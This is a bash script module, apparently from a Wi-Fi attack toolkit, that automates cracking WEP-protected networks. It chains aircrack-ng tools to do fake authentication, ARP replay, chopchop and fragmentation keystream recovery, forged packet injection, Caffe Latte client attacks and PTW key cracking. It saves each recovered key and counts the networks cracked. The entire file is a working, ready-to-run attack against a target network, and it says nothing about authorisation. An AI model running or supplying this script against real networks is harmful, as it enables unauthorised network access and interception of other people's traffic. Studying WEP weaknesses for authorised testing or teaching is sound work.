# WEP (Wired Equivalent Privacy) Attack Implementation
#
# WEP is a deprecated and fundamentally broken security protocol
# Multiple attack vectors make WEP vulnerable to key recovery in minutes
#
# References:
# - https://www.aircrack-ng.org/doku.php?id=wep (Comprehensive WEP attack guide)
# - FMS Attack (2001): https://dl.acm.org/doi/10.5555/646557.694759
# - PTW Attack (2007): https://eprint.iacr.org/2007/120.pdf (Faster key recovery)
# - Chopchop Attack: Decrypts packets without knowing key
# - Fragmentation Attack: Generates keystream for packet injection
# - Caffe Latte Attack: Client-side attack (works without AP nearby)
#
# Attack Methods:
# 1. ARP Request Replay - Generate IVs for statistical analysis
# 2. Chopchop - Decrypt packets byte-by-byte
# 3. Fragmentation - Recover PRGA for packet injection
# 4. Caffe Latte - Client-side attack
#
# Requirements: aircrack-ng suite

attack_wep() {
    log_warning "WEP is a deprecated protocol - This attack is mainly for legacy systems"
    log_info "Starting WEP attack on $TARGET_ESSID..."
    
    # Verify WEP encryption
    if ! check_wep_encryption; then
        log_error "Target does not appear to use WEP encryption"
        return 1
    fi
    
    # WEP attack mode selection
    echo ""
    log_info "WEP Attack Methods:"
    echo ""
    echo "  1) ARP Request Replay (standard, requires active client)"
    echo "  2) Chopchop Attack (decrypt packets without key)"
    echo "  3) Fragmentation Attack (generate keystream)"
    echo "  4) Caffe Latte (client-side, works without AP)"
    echo "  5) Combined attack (recommended)"
    echo ""
    
    read -p "Select WEP attack method [5]: " wep_method
    wep_method=${wep_method:-5}
    
    case $wep_method in
        1)
            attack_wep_arp_replay
            ;;
        2)
            attack_wep_chopchop
            ;;
        3)
            attack_wep_fragmentation
            ;;
        4)
            attack_wep_caffe_latte
            ;;
        5)
            # Try multiple attack methods
            log_info "Attempting combined WEP attack..."
            if attack_wep_arp_replay; then
                return 0
            elif attack_wep_fragmentation; then
                return 0
            elif attack_wep_chopchop; then
                return 0
            else
                log_error "All WEP attack methods failed"
                return 1
            fi
            ;;
        *)
            log_error "Invalid selection"
            return 1
            ;;
    esac
}

check_wep_encryption() {
    # Check if target uses WEP (from previous scan data)
    local scan_file="${OUTPUT_DIR}/scan-01-01.csv"
    
    if [ -f "$scan_file" ]; then
        grep "$TARGET_BSSID" "$scan_file" | grep -qi "WEP"
        return $?
    else
        log_warning "No scan data available, assuming WEP"
        return 0
    fi
}

attack_wep_arp_replay() {
    log_info "Starting WEP ARP Request Replay attack..."
    log_info "This attack captures and replays ARP packets to generate IVs"
    
    local wep_capture="$OUTPUT_DIR/${TARGET_ESSID//[^a-zA-Z0-9]/_}_wep"
    
    # Start packet capture
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        -w "$wep_capture" "$MONITOR_INTERFACE" &
    local airodump_pid=$!
    
    sleep 5
    
    # Fake authentication (required for injection)
    log_info "Performing fake authentication..."
    aireplay-ng --fakeauth 0 -a "$TARGET_BSSID" -h "$(get_monitor_mac)" "$MONITOR_INTERFACE" &
    local fakeauth_pid=$!
    
    sleep 5
    
    # ARP request replay
    log_info "Starting ARP request replay..."
    log_info "Waiting for ARP packet (this may take a while)..."
    
    aireplay-ng --arpreplay -b "$TARGET_BSSID" -h "$(get_monitor_mac)" "$MONITOR_INTERFACE" &
    local arpreplay_pid=$!
    
    # Monitor IV count
    log_info "Collecting initialization vectors (IVs)..."
    log_info "Need ~40,000-85,000 IVs for 64-bit WEP, ~500,000+ for 128-bit WEP"
    
    # Wait for sufficient IVs (timeout after 30 minutes)
    local elapsed=0
    local max_time=1800
    
    while [ $elapsed -lt $max_time ]; do
        sleep 30
        ((elapsed+=30))
        
        # Check IV count
        local ivs=$(ls -1 "${wep_capture}"-*.cap 2>/dev/null | head -1 | xargs aircrack-ng 2>/dev/null | grep -oP "\d+ IVs" | grep -oP "\d+" || echo "0")
        
        echo -ne "\r${BLUE}[*]${NC} Collected IVs: $ivs (Elapsed: ${elapsed}s)"
        
        # Try cracking if we have enough IVs
        if [ "$ivs" -gt 40000 ]; then
            echo ""
            log_info "Attempting to crack WEP key..."
            
            if crack_wep_key "$wep_capture"; then
                # Cleanup
                kill $airodump_pid $fakeauth_pid $arpreplay_pid 2>/dev/null || true
                return 0
            fi
        fi
    done
    
    echo ""
    log_error "Timeout reached without sufficient IVs"
    
    # Cleanup
    kill $airodump_pid $fakeauth_pid $arpreplay_pid 2>/dev/null || true
    return 1
}

attack_wep_chopchop() {
    log_info "Starting WEP Chopchop attack..."
    log_info "This decrypts a packet without knowing the key"
    
    local wep_capture="$OUTPUT_DIR/${TARGET_ESSID//[^a-zA-Z0-9]/_}_chopchop"
    
    # Start capture
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        -w "$wep_capture" "$MONITOR_INTERFACE" &
    local airodump_pid=$!
    
    sleep 5
    
    # Fake auth
    aireplay-ng --fakeauth 0 -a "$TARGET_BSSID" -h "$(get_monitor_mac)" "$MONITOR_INTERFACE"
    
    # Chopchop attack
    log_info "Executing chopchop attack..."
    aireplay-ng --chopchop -b "$TARGET_BSSID" -h "$(get_monitor_mac)" "$MONITOR_INTERFACE" 2>&1 | tee "$OUTPUT_DIR/chopchop_result.txt"
    
    # Check for XOR file (decrypted packet)
    if ls replay_dec-*.xor 2>/dev/null | head -1; then
        log_success "Chopchop successful! XOR file created"
        
        # Use XOR file to forge packets
        local xor_file=$(ls replay_dec-*.xor 2>/dev/null | head -1)
        
        # Create ARP packet for injection
        packetforge-ng --arp -a "$TARGET_BSSID" -h "$(get_monitor_mac)" \
            -k 255.255.255.255 -l 255.255.255.255 -y "$xor_file" \
            -w "${wep_capture}_arp.cap"
        
        # Inject forged packets
        aireplay-ng --interactive -r "${wep_capture}_arp.cap" "$MONITOR_INTERFACE" &
        
        # Continue with standard IV collection and cracking
        attack_wep_arp_replay
    else
        log_error "Chopchop attack failed"
        kill $airodump_pid 2>/dev/null || true
        return 1
    fi
}

attack_wep_fragmentation() {
    log_info "Starting WEP Fragmentation attack..."
    log_info "This recovers PRGA to create packets"
    
    # Fake auth
    aireplay-ng --fakeauth 0 -a "$TARGET_BSSID" -h "$(get_monitor_mac)" "$MONITOR_INTERFACE"
    
    # Fragmentation attack
    log_info "Executing fragmentation attack..."
    aireplay-ng --fragment -b "$TARGET_BSSID" -h "$(get_monitor_mac)" "$MONITOR_INTERFACE" 2>&1 | tee "$OUTPUT_DIR/frag_result.txt"
    
    # Check for XOR file
    if ls fragment-*.xor 2>/dev/null | head -1; then
        log_success "Fragmentation successful! XOR file created"
        
        # Continue like chopchop
        local xor_file=$(ls fragment-*.xor 2>/dev/null | head -1)
        
        packetforge-ng --arp -a "$TARGET_BSSID" -h "$(get_monitor_mac)" \
            -k 255.255.255.255 -l 255.255.255.255 -y "$xor_file" \
            -w "$OUTPUT_DIR/frag_arp.cap"
        
        aireplay-ng --interactive -r "$OUTPUT_DIR/frag_arp.cap" "$MONITOR_INTERFACE" &
        
        attack_wep_arp_replay
    else
        log_error "Fragmentation attack failed"
        return 1
    fi
}

attack_wep_caffe_latte() {
    log_info "Starting WEP Caffe Latte attack (client-side)..."
    log_warning "This attack targets WEP clients, not the AP"
    
    # Caffe Latte requires client to be in range
    log_info "Waiting for client to connect..."
    
    aireplay-ng --caffe-latte -b "$TARGET_BSSID" -h "$(get_monitor_mac)" "$MONITOR_INTERFACE" 2>&1 | tee "$OUTPUT_DIR/caffe_latte_result.txt"
    
    # After generating traffic, crack like normal
    attack_wep_arp_replay
}

crack_wep_key() {
    local capture_file="$1"
    
    log_info "Attempting WEP key recovery with aircrack-ng..."
    
    # Use PTW attack (faster) if available
    aircrack-ng -z "${capture_file}"-*.cap 2>&1 | tee "$OUTPUT_DIR/wep_crack_result.txt"
    
    # Check for success
    if grep -q "KEY FOUND" "$OUTPUT_DIR/wep_crack_result.txt"; then
        local wep_key=$(grep "KEY FOUND" "$OUTPUT_DIR/wep_crack_result.txt" | grep -oP "\[\s*\K[0-9A-F:]+(?=\s*\])")
        
        echo ""
        log_success "═══════════════════════════════════════════════════"
        log_success "WEP KEY RECOVERED!"
        log_success "  Network: $TARGET_ESSID"
        log_success "  BSSID: $TARGET_BSSID"
        log_success "  WEP Key: $wep_key"
        log_success "═══════════════════════════════════════════════════"
        echo ""
        
        # Save results
        {
            echo "Network: $TARGET_ESSID"
            echo "BSSID: $TARGET_BSSID"
            echo "WEP Key: $wep_key"
            echo "Attack: WEP"
            echo "Date: $(date)"
        } > "$OUTPUT_DIR/cracked_password.txt"
        
        STATS_NETWORKS_CRACKED=$((STATS_NETWORKS_CRACKED + 1))
        return 0
    else
        return 1
    fi
}

get_monitor_mac() {
    # Get MAC address of monitor interface
    ip link show "$MONITOR_INTERFACE" | grep -oP "(?<=ether\s)[0-9a-f:]{17}"
}
